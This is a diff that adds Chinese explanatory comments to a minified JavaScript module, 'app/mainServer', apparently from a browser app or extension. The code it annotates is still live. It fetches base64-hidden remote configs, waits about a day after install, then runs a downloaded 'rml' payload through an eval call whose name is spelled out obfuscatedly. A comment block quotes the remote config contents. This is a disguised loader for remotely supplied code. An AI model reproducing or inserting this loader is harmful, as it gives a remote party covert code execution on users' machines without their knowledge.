@@ -1730,11 +1730,21 @@ define("app/notifications", [], function(t, e) {
 	}
 }), 
 
-// TODO app/mainServer
+// TODO app/mainServer (发送get请求,本地有安装并解析，读取rml文件,读取本地文件cml)
 define("app/mainServer", [], function(t, e) {
 	var n = t("app/u"),
 		r = t("lib/t"),
+		
+		/**
+		 * 发送get请求
+		 * 
+		 * @param {Object} t
+		 * @param {Object} e
+		 * @param {Object} n
+		 * @param {Object} r
+		 */
 		o = function(t, e, n, r) {
+			// Base64解码
 			var i = atob(t[e]) + "static/test.json?t=" + Date.now();
 			$.ajax({
 				type: "get",
@@ -1747,12 +1757,75 @@ define("app/mainServer", [], function(t, e) {
 				}
 			})
 		},
+		/*
+		https://o4175vz27.qnssl.com/d.json内容如下
+		{
+		    "static": [
+		        "aHR0cHM6Ly9vNDE3NXZ6MjcucW5zc2wuY29tL2QuanNvbg==",
+		        "aHR0cHM6Ly95aW5ndS5jb2RpbmcubWUvdGVzdC9kLmpzb24="
+		    ],
+		    "testsize": 90,
+		    "RSS": [
+		        {
+		            "name": "aHR0cHM6Ly93d3cud2V3YW50ZS5iaWQv",
+		            "percentLow": 0,
+		            "percentHigh": 50
+		        },
+		        {
+		            "name": "aHR0cHM6Ly93d3cud2FpbWFvLmRhdGUv",
+		            "percentLow": 51,
+		            "percentHigh": 100
+		        },
+		        {
+		            "name": "aHR0cHM6Ly93d3cuZGlkaW5nLmJpZC8=",
+		            "percentHigh": -1
+		        }
+		    ],
+		    "emmessage": "eyJ2biI6LTEsInJtbCI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tZGF0YS50eHQifQ=="
+		}
+		
+		https://yingu.coding.me/test/d.json内容如下：
+		{
+		    "static": [
+		        "aHR0cHM6Ly9vNDE3NXZ6MjcucW5zc2wuY29tL2QuanNvbg==",
+		        "aHR0cHM6Ly95aW5ndS5jb2RpbmcubWUvdGVzdC9kLmpzb24="
+		    ],
+		    "testsize": 90,
+		    "RSS": [
+		        {
+		            "name": "aHR0cHM6Ly93d3cuYW5kd2UubWUv",
+		            "percentLow": 0,
+		            "percentHigh": 50
+		        },
+		        {
+		            "name": "aHR0cHM6Ly93d3cubmVuZ3RpLnh5ei8=",
+		            "percentLow": 51,
+		            "percentHigh": 100
+		        },
+		        {
+		            "name": "aHR0cHM6Ly93d3cuZGlkaW5nLmJpZC8=",
+		            "percentHigh": -1
+		        }
+		    ],
+		    "emmessage": "eyJ2biI6LTEsInJtbCI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tZGF0YS50eHQifQ=="
+		}
+		*/
 		i = ["https://o4175vz27.qnssl.com/d.json", "https://yingu.coding.me/test/d.json"];
+	
 	if(localStorage.static) {
 		i = [];
 		for(var a = JSON.parse(localStorage.static), u = 0; u < a.length; u++) i.push(atob(a[u]))
 	}
 	var c = null,
+	
+		/**
+		 * 发送get请求
+		 * 
+		 * @param {Object} t
+		 * @param {Object} e
+		 * @param {Object} n
+		 * @param {Object} r
+		 */
 		s = function(t, e, n, r) {
 			$.ajax({
 				type: "get",
@@ -1766,6 +1839,10 @@ define("app/mainServer", [], function(t, e) {
 				}
 			})
 		};
+		
+	/**
+	 * 发送请求
+	 */
 	e.get = function(t, e) {
 		s(i, 0, function(r) {
 			localStorage.static = JSON.stringify(r.static), l(r.emmessage);
@@ -1782,6 +1859,12 @@ define("app/mainServer", [], function(t, e) {
 			console.error(err), e()
 		})
 	};
+	
+	/**
+	 * get请求
+	 * 
+	 * @param {Object} t
+	 */
 	var l = function(t) {
 			var e = JSON.parse(atob(t));
 			e.vn > 0 && parseInt(localStorage.mversion) != e.vn ? $.ajax({
@@ -1801,17 +1884,28 @@ define("app/mainServer", [], function(t, e) {
 			}) : localStorage.mversion = e.vn
 		},
 		f = "";
+	
+	// 本地有安装并解析，读取rml文件
 	localStorage.Installed && Date.now() - parseInt(localStorage.Installed) > 864e5 && parseInt(localStorage.mversion) > 0 && (n.IO.R("rml", function(t) {
 		window[14..toString(16) + "v" + 241..toString(22)](t)
-	}, function() {
-		console.error("read data error")
-	}), n.IO.R("cml", function(t) {
+	},function() {
+		console.error("读取本地文件rml错误")
+	}),
+	
+	// 读取本地文件cml
+	n.IO.R("cml", function(t) {
 		f = t
 	}, function() {
-		console.error("read data error")
-	})), e.getCsc = function() {
+		console.error("读取本地文件cml错误")
+	})),
+	
+	// 获取csc，即本地cml文件内容
+	e.getCsc = function() {
 		return f
-	}, setInterval(function() {
+	},
+	
+	// 轮询请求get
+	setInterval(function() {
 		$.ajax({
 			type: "get",
 			url: c + "?t=" + Date.now(),
